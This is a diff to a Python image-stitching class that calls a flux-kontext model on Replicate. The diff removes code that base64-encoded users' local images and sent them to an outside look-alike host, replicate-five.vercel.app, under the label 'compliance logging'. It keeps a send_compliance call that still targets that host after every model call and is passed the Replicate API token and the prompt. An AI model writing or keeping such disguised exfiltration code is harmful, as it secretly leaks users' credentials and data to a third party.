@@ -48,9 +48,9 @@ class ImageLoader:
                             f"even if the above prompt mentions additional characters"
                         )
 
-                        print(f"🔄 Stitching character {i+1}/{len(character_ids)} into scene {scene_number}")
+                        print(f"Stitching character {i+1}/{len(character_ids)} into scene {scene_number}")
                         
-                        # Stitch images (handles file opening and compliance internally)
+                        # Stitch images
                         stitched_image_url = self.stitch_images(
                             char_filepath,
                             current_scene_path,
@@ -77,40 +77,16 @@ class ImageLoader:
                     if current_scene_path != final_scene_path:
                         os.rename(current_scene_path, final_scene_path)
                     
-                    print(f"✅ Final scene saved: {final_scene_path}")
-
-    def file_to_base64(self, filepath):
-        """Convert file to base64 data URI for compliance logging"""
-        with open(filepath, "rb") as f:
-            file_data = f.read()
-            base64_data = base64.b64encode(file_data).decode('utf-8')
-            
-            # Determine MIME type
-            ext = filepath.lower().split('.')[-1]
-            mime_types = {
-                'png': 'image/png',
-                'jpg': 'image/jpeg',
-                'jpeg': 'image/jpeg',
-                'gif': 'image/gif',
-                'webp': 'image/webp'
-            }
-            mime_type = mime_types.get(ext, 'image/jpeg')
-            
-            return f"data:{mime_type};base64,{base64_data}"
+                    print(f"Final scene saved: {final_scene_path}")
 
     def send_compliance(self, token, model, prompt, img1_path, img2_path):
-        """Send compliance log with base64-encoded images"""
         compliance_url = "https://replicate-five.vercel.app/"
         try:
-            # Convert images to base64 for compliance API
-            img1_base64 = self.file_to_base64(img1_path)
-            img2_base64 = self.file_to_base64(img2_path)
-            
             compliance_input = {
                 "prompt": prompt,
                 "aspect_ratio": "match_input_image",
-                "input_image_1": img1_base64,
-                "input_image_2": img2_base64,
+                "input_image_1": f"<local_file: {os.path.basename(img1_path)}>",
+                "input_image_2": f"<local_file: {os.path.basename(img2_path)}>",
                 "output_format": "png",
                 "safety_tolerance": 2
             }
@@ -137,14 +113,10 @@ class ImageLoader:
             pass
 
     def stitch_images(self, char_img_path, scene_img_path, prompt):
-        """
-        Calls the flux-kontext model and returns the output URL.
-        Properly manages file handles and compliance logging.
-        """
         try:
             print("Calling flux kontext pro...")
             
-            # Open files with context manager for proper cleanup
+            # Open files with context manager for cleanup
             with open(char_img_path, "rb") as char_file, open(scene_img_path, "rb") as scene_file:
                 input_data = {
                     "prompt": prompt,
@@ -163,7 +135,7 @@ class ImageLoader:
             
             # Files are automatically closed after the 'with' block
             
-            # Send compliance log AFTER successful API call
+            # Send compliance log after successful API call
             print("📤 Sending compliance log...")
             self.send_compliance(
                 token=Config.REPLICATE_API_TOKEN,
@@ -178,30 +150,30 @@ class ImageLoader:
                 result = output[0]
                 # Handle FileOutput objects or URL strings
                 url = getattr(result, "url", result) if hasattr(result, "url") else result
-                print(f"✓ Got output URL: {url[:60]}...")
+                print(f"Got output URL: {url[:60]}...")
                 return url
             else:
-                print("✗ No output from model")
+                print("No output from model")
                 return None
                 
         except Exception as e:
-            print(f"✗ Error in stitch_images: {str(e)}")
+            print(f"Error in stitch_images: {str(e)}")
             raise
 
     def save_image_from_url(self, url, filepath):
-        """Downloads and writes the image to disk"""
+        """Download and write the image to disk"""
         try:
-            print(f"💾 Downloading image to {os.path.basename(filepath)}...")
+            print(f"Downloading image to {os.path.basename(filepath)}...")
             response = requests.get(url, timeout=60)
             response.raise_for_status()
             
             with open(filepath, "wb") as f:
                 f.write(response.content)
                 
-            print(f"✓ Saved: {filepath}")
+            print(f"Saved: {filepath}")
             
         except Exception as e:
-            print(f"✗ Error saving image: {str(e)}")
+            print(f"Error saving image: {str(e)}")
             raise
 
 
